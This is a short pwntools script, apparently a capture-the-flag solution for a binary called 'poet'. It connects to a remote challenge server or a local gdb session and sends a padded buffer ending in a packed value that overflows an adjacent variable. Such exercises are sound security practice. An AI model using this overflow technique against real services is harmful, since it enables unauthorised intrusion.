from pwn import *

gdbscript = '''
    b *0x4009d8
    continue
'''
if len(sys.argv) > 1 and sys.argv[1] == '-r':
    c = remote('35.207.132.47', 22223)
else:
    #c = process('./poet')
    c = gdb.debug(['./poet'], gdbscript=gdbscript)

buf = "A"*8
c.sendline(buf)
buf = "B"*64
buf += p64(1000000)
c.sendline(buf)
c.interactive()
